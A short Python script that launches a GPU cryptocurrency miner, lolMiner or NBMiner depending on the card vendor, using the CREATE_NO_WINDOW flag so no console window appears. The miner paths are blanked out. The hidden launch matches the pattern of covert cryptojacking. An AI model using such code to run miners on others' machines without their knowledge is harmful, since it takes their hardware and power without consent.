import subprocess
import os

# path_lolminer = os.path.join(os.getcwd(), "-------")
# path_nbminer = os.path.join(os.getcwd(), "-------")
def runn_miner_gpu(gpus):
    for i in range(len(gpus)):
        gpu = gpus[i]
        gpu_name = gpu.name
        if 'AMD' in gpu_name:
            # NB MINER
            open_cmd(os.path.join(os.getcwd(), "-------"))
        else:
            # LOL MINER
            open_cmd(os.path.join(os.getcwd(), "-------"))
def open_cmd(path):
    subprocess.Popen([path], creationflags=subprocess.CREATE_NO_WINDOW)


